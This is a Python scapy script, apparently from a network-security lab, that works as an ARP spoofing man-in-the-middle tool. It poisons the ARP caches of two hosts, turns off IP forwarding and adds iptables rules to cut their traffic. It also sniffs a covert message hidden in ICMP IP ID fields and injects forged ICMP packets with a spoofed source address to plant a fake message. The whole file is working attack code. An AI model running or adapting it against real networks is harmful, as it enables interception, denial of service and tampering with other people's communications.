from scapy.all import *
import argparse
import time
import os
import signal
import sys

captured_message = []

def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Đã tắt IP forwarding (chặn chuyển tiếp gói).")

def block_traffic_between(sender_ip, receiver_ip):
    os.system(f"iptables -A INPUT -s {sender_ip} -d {receiver_ip} -j DROP")
    os.system(f"iptables -A OUTPUT -s {sender_ip} -d {receiver_ip} -j DROP")
    print(f"[+] Đã chặn gói giữa {sender_ip} và {receiver_ip} (INPUT/OUTPUT)")

def unblock_traffic(sender_ip, receiver_ip):
    os.system(f"iptables -D INPUT -s {sender_ip} -d {receiver_ip} -j DROP")
    os.system(f"iptables -D OUTPUT -s {sender_ip} -d {receiver_ip} -j DROP")
    print(f"[+] Đã gỡ bỏ rule iptables (INPUT/OUTPUT)")

def spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"[ERROR] Không tìm thấy MAC của {target_ip}")
        return
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    send(arp_response, verbose=False)

def sniff_handler(signum, frame):
    print("\n[+] Stop sniff.")
    decoded_message = ''.join(captured_message)
    print(f"[+] Hidden message: {decoded_message}")
    sys.exit(0)

def sniff_callback(packet):
    if IP in packet and ICMP in packet and packet[ICMP].type == 8:
        ip_id = packet[IP].id
        first_char = chr((ip_id >> 8) & 0xFF)
        second_char = chr(ip_id & 0xFF)
        captured_message.append(first_char)
        captured_message.append(second_char)
        print(f"[+] Captured: {first_char}{second_char} (IP ID = {ip_id})")

def start_sniff():
    signal.signal(signal.SIGINT, sniff_handler)
    print("[*] Sniffing to decode the message...")
    sniff(filter="icmp", prn=sniff_callback)

def inject_message(sender_ip, receiver_ip, message):
    if len(message) % 2 != 0:
        message += "\0"
    for i in range(0, len(message), 2):
        id_val = (ord(message[i]) << 8) | ord(message[i + 1])
        pkt = IP(src=sender_ip, dst=receiver_ip, id=id_val) / ICMP()
        send(pkt, verbose=False)
        time.sleep(0.5)
    print("[+] Successfully modified the message.")

def run_spoof_mode(sender_ip, receiver_ip):
    disable_ip_forwarding()
    block_traffic_between(sender_ip, receiver_ip)
    try:
        print("[*] Start ARP spoofing. Press Ctrl+C to stop.")
        while True:
            spoof(sender_ip, receiver_ip)
            spoof(receiver_ip, sender_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Stop. Restore iptables...")
        unblock_traffic(sender_ip, receiver_ip)

def main():
    parser = argparse.ArgumentParser(
        description="*Tool ARP Spoof*\n"
                    "  spoof  - ARP spoof and intercept traffic between sender-receiver\n"
                    "  decode - sniff & decode the message hidden in IP ID (ICMP)\n"
                    "  modify - Send the modified message to the receiver",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--mode", required=True, choices=["spoof", "decode", "modify"],
                        help="Module: spoof, decode, modify")
    parser.add_argument("-t", "--target", help="IP sender")
    parser.add_argument("-g", "--receiver", help="IP receiver")
    parser.add_argument("--message", help="Fake_message")

    args = parser.parse_args()

    if args.mode == "spoof":
        if not args.target or not args.receiver:
            print("[-] Thiếu IP sender (-t) hoặc receiver (-g) cho chế độ spoof.")
            return
        run_spoof_mode(args.target, args.receiver)

    elif args.mode == "decode":
        start_sniff()

    elif args.mode == "modify":
        if not args.target or not args.receiver or not args.message:
            print("[-] Thiếu thông tin -t, -g, hoặc --message cho chế độ modify.")
            return
        inject_message(args.target, args.receiver, args.message)

if __name__ == "__main__":
    main()

